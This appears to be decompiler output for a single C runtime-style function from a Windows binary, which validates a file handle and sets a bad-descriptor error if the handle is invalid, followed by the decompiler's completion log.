int __cdecl sub_40A4DE(int a1)
{
  int *v2; // [esp+4h] [ebp-4h] BYREF

  if ( a1 == -2 )
  {
    *__doserrno() = 0;
    *_errno() = 9;
  }
  else
  {
    if ( a1 >= 0
      && a1 < (unsigned int)dword_413138
      && (*(_BYTE *)(dword_412F38[a1 >> 6] + 48 * (a1 & 0x3F) + 40) & 1) != 0 )
    {
      v2 = &a1;
      return sub_40A4B6(a1, (int)&v2);
    }
    *__doserrno() = 0;
    *_errno() = 9;
    _invalid_parameter_noinfo();
  }
  return -1;
}
// 412F38: using guessed type int dword_412F38[128];
// 413138: using guessed type int dword_413138;

// nfuncs=392 queued=53 decompiled=53 lumina nreq=0 worse=0 better=0
// ALL OK, 53 function(s) have been successfully decompiled
